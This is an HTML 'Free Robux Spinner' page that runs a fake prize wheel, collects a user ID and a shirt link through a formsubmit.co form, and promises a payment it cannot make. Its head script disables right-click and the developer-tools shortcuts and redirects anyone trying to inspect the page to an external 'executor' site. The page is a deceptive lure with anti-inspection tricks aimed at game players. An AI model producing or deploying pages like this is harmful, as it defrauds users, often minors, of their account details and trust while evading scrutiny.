<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Free Robux Spinner</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    input, button { padding: 10px; font-size: 16px; margin: 5px; }
    .hidden { display: none; }
    canvas { margin-top: 20px; }
@import url('https://fonts.googleapis.com/css?family=Muli:300,700&display=swap');

* {
  box-sizing: border-box;
}

body {
  background-color: #fbfcfe;
  font-family: 'Muli', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
  overflow: hidden;
  margin: 0;
}

.container {
  background-color: #fff;
  border: 3px #000 solid;
  border-radius: 10px;
  padding: 30px;
  max-width: 1000px;
  text-align: center;
}

.code-container {
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 40px 0;
}

.code {
  caret-color: transparent;
  border-radius: 5px;
  font-size: 75px;
  height: 120px;
  width: 100px;
  border: 1px solid #eee;
  margin: 1%;
  text-align: center;
  font-weight: 300;
  -moz-appearance: textfield;
}

.code::-webkit-outer-spin-button,
.code::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

.code:valid {
  border-color: #3498db;
  box-shadow: 0 10px 10px -5px rgba(0, 0, 0, 0.25);
}

.info {
  background-color: #eaeaea;
  display: inline-block;
  padding: 10px;
  line-height: 20px;
  max-width: 400px;
  color: #777;
  border-radius: 5px;
}

@media (max-width: 600px) {
  .code-container {
    flex-wrap: wrap;
  }

  .code {
    font-size: 60px;
    height: 80px;
    max-width: 70px;
  }
}
  </style>
</head>
<script>
  // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ü–ö–ú –∏ –∫–ª–∞–≤–∏—à
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('keydown', e => {
    const keys = ['F12', 'I', 'J', 'C', 'U', 'S'];
    const rusKeys = ['–®', '–û', '–ì', '–´', '–Ü'];
    if (
      e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && (keys.includes(e.key) || rusKeys.includes(e.key))) ||
      (e.ctrlKey && (keys.includes(e.key) || rusKeys.includes(e.key)))
    ) {
      e.preventDefault();
      window.location.href = 'https://fimoz-2-0-executor.neocities.org/';
    }
  });
</script>

<body>

  <h1>üéÅ Get Free Robux</h1>

  <div id="step1">
    <p>Enter your ECSR User ID</p>
    <input id="userId" placeholder="ECSR ID">
    <button onclick="startSpinner()">Start</button>
  </div>

  <div id="step2" class="hidden">
    <p>Spinning for Robux...</p>
    <canvas id="wheel" width="300" height="300"></canvas>
    <p id="robuxDisplay">...</p>
  </div>

  <div id="step3" class="hidden">
    <p>Bonus Multiplier...</p>
    <p id="bonusDisplay">...</p>
  </div>

  <div id="step4" class="hidden">
    <p>Enter link to your shirt</p>
    <input id="shirtLink" placeholder="https://roblox.com/catalog/">
    <form id="robuxForm" action="https://formsubmit.co/YOUREMAIL@example.com" method="POST">
      <input type="hidden" name="ECSR User ID" id="formUserId">
      <input type="hidden" name="Robux Amount" id="formRobux">
      <input type="hidden" name="Shirt Link" id="formShirt">
      <button type="submit">Submit</button>
    </form>
  </div>

  <div id="done" class="hidden">
    <p>Success! Wait for payment üí∏</p>
  </div>

  <script>
    let robux = 0;
    const options = [5, 10, 20, 50];

    function drawWheel(ctx, rotation) {
      const radius = 150;
      const cx = 150, cy = 150;
      ctx.clearRect(0, 0, 300, 300);
      for (let i = 0; i < options.length; i++) {
        const angle = (2 * Math.PI / options.length) * i + rotation;
        ctx.beginPath();
        ctx.moveTo(cx, cy);
        ctx.arc(cx, cy, radius, angle, angle + 2 * Math.PI / options.length);
        ctx.fillStyle = i % 2 === 0 ? '#f2c94c' : '#f2994a';
        ctx.fill();
        ctx.fillStyle = 'black';
        ctx.font = '16px sans-serif';
        const textAngle = angle + Math.PI / options.length;
        const tx = cx + Math.cos(textAngle) * 100;
        const ty = cy + Math.sin(textAngle) * 100;
        ctx.fillText(options[i], tx - 10, ty);
      }
    }

    function startSpinner() {
      const userId = document.getElementById("userId").value.trim();
      if (!userId) return alert("Please enter your User ID!");
      document.getElementById("step1").classList.add("hidden");
      document.getElementById("step2").classList.remove("hidden");

      const canvas = document.getElementById('wheel');
      const ctx = canvas.getContext('2d');
      let angle = 0;
      let velocity = Math.random() * 0.3 + 0.3;
      let spinning = setInterval(() => {
        angle += velocity;
        velocity *= 0.97;
        drawWheel(ctx, angle);
        if (velocity < 0.01) {
          clearInterval(spinning);
          const normalizedAngle = angle % (2 * Math.PI);
          const segment = Math.floor((options.length - (normalizedAngle / (2 * Math.PI)) * options.length)) % options.length;
          robux = options[segment] / 2;
          document.getElementById("robuxDisplay").innerText = `${robux} Robux`;
          setTimeout(spinBonus, 2000);
        }
      }, 30);
    }

    function spinBonus() {
      document.getElementById("step2").classList.add("hidden");
      document.getElementById("step3").classList.remove("hidden");

      document.getElementById("bonusDisplay").innerText = "√ó2";
      robux *= 2;

      setTimeout(() => {
        document.getElementById("step3").classList.add("hidden");
        document.getElementById("step4").classList.remove("hidden");

        document.getElementById("formUserId").value = document.getElementById("userId").value;
        document.getElementById("formRobux").value = robux;
        document.getElementById("formShirt").value = document.getElementById("shirtLink").value;
      }, 2000);
    }
  </script>

</body>
</html>
